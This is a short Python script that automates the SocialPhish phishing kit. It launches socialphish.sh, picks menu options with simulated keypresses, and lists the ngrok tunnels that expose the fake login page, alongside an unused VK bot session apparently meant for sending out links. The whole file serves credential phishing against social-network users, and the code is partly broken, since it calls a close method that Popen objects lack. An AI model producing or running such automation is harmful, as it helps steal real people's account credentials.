import subprocess
import os
import time
import pyautogui
import vk_api
import random
import sys
import pyngrok
from pyngrok import ngrok
from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType

vk_session = vk_api.VkApi(token='')
longpoll_bot = VkBotLongPoll(vk_session, 'id group')
vk = vk_session.get_api()

def check_open_ngrok () :
    time.sleep(10)
    active_tunnels = ngrok.get_tunnels()
    print(active_tunnels)



os.chdir("/home/noname/SocialPhish")
list_dir = subprocess.Popen(['bash','socialphish.sh'])
pyautogui.typewrite('1')
pyautogui.press('enter')
pyautogui.press('2')
pyautogui.press('enter')
check_open_ngrok()
list_dir.wait()
list_dir.close()